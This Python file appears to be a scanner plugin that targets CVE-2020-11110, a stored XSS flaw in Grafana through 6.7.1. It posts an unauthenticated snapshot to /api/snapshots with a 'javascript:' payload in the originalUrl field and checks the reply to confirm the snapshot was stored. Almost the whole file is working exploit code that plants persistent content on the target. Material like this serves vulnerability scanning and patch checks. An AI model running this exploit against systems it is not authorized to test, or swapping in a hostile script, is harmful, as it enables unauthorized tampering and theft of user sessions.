import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Grafana Unauthenticated Stored XSS''',
        "description": '''Grafana through 6.7.1 allows stored XSS due to insufficient input protection in the originalUrl field, which allows an attacker to inject JavaScript code that will be executed after clicking on Open Original Dashboard after visiting the snapshot.''',
        "severity": "medium",
        "references": [
            "https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html", 
            "https://nvd.nist.gov/vuln/detail/CVE-2020-11110"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-11110",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "xss", "grafana"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/snapshots"""
        method = "POST"
        data = {"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":True,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":True}]},"editable":True,"gnetId":None,"graphTooltip":0,"id":None,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":None,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":None,"version":0},"name":"Dashboard","expires":0}
        headers = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.5', 'content-type': 'application/json', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""application/json""" in str(resp0.headers)) and ("""deleteKey":""" in resp0.text and """deleteUrl":""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url